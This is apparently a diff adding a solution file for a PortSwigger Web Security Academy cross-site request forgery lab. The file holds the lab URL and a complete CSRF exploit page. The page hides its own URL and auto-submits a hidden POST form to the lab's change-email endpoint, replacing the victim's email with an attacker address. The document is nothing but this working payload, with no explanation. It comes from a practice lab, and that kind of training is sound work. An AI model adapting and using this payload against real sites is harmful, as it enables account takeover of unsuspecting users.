@@ -1,0 +1,14 @@
+https://portswigger.net/web-security/csrf/lab-no-defenses
+
+<html>
+  <body>
+  <script>history.pushState('','','/')</script>
+     <form action="https://0ab9003304d0e51cc0b75e0800c100cb.web-security-academy.net/my-account/change-email" method="POST"> 
+       <input type="hidden" name="email" value="hacker&#64;hacking&#46;co" />
+       <input type="submit" value="Submit request" />
+     </form>
+     <script>
+       document.forms[0].submit();
+     </script>
+  </body>
+</html>
